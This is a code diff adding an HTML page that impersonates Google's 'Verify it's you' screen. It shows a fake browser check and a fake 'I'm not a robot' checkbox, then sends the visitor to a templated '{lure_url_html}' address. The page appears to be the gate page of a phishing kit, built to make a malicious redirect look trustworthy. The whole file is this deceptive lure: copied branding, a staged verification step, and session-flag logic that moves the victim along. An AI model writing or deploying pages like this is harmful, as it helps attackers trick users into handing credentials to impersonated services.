@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it’s you</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Google Sans", Roboto, Arial, sans-serif;
+            background: #fff;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            width: 420px;
+            max-width: 92vw;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .logo { margin-bottom: 24px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 28px; }
+        .box {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 16px;
+            cursor: pointer;
+            user-select: none;
+            text-align: left;
+        }
+        .box:hover { background: #f8f9fa; }
+        .check {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #5f6368;
+            border-radius: 2px;
+            flex-shrink: 0;
+        }
+        .check.done {
+            background: #1a73e8;
+            border-color: #1a73e8;
+        }
+        .check.done::after {
+            content: "";
+            display: block;
+            width: 6px;
+            height: 12px;
+            margin: 2px 0 0 8px;
+            border: solid #fff;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+        .spin {
+            width: 28px;
+            height: 28px;
+            margin: 0 auto 16px;
+            border: 3px solid #e8eaed;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .foot { margin-top: 28px; font-size: 12px; color: #80868b; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <svg width="74" height="24" viewBox="0 0 74 24" aria-hidden="true">
+                <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.78 4.43 1.79L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.87 6.28-2.51 1.63-1.62 2.14-3.91 2.14-5.75 0-.57-.04-1.1-.13-1.55H9.24z"/>
+                <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                <path fill="#4285F4" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3-2.89 0-5.52 2.53-5.52 5.82 0 3.27 2.63 5.8 5.52 5.8 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.25-1.5-3.25-3.52 0-2.04 1.49-3.52 3.25-3.52 1.74 0 3.25 1.48 3.25 3.54 0 2.04-1.51 3.5-3.25 3.5z"/>
+                <path fill="#FBBC05" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                <path fill="#34A853" d="M58.03 3.32v14.49h2.55V3.32z"/>
+                <path fill="#EA4335" d="M68.26 15.34c-1.17 0-2.01-.4-2.61-1.22l7.58-3.13-.25-.64c-.48-1.21-1.94-3.47-4.92-3.47-2.96 0-5.44 2.33-5.44 5.82 0 3.27 2.48 5.81 5.8 5.81 2.68 0 4.22-1.63 4.87-2.57l-2-1.32c-.66.96-1.56 1.72-2.03 1.72zm-.18-7.15c1.04 0 1.92.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
+            </svg>
+        </div>
+        <div id="wait">
+            <div class="spin"></div>
+            <h1>Checking your browser</h1>
+            <p>This helps keep your account safe from bots.</p>
+        </div>
+        <div id="ask" style="display:none;">
+            <h1>Verify it’s you</h1>
+            <p>Select the checkbox to continue to Google.</p>
+            <div class="box" id="box">
+                <div class="check" id="check"></div>
+                <span>I’m not a robot</span>
+            </div>
+        </div>
+        <div class="foot">Protected connection</div>
+    </div>
+    <script>
+        (function () {
+            if (sessionStorage.getItem('g_verified') === 'true') {
+                window.location.href = '{lure_url_html}' + window.location.hash;
+                return;
+            }
+            setTimeout(function () {
+                document.getElementById('wait').style.display = 'none';
+                document.getElementById('ask').style.display = 'block';
+            }, 1200);
+            document.getElementById('box').addEventListener('click', function () {
+                document.getElementById('check').classList.add('done');
+                sessionStorage.setItem('g_verified', 'true');
+                setTimeout(function () {
+                    window.location.href = '{lure_url_html}' + window.location.hash;
+                }, 600);
+            });
+        })();
+    </script>
+</body>
+</html>
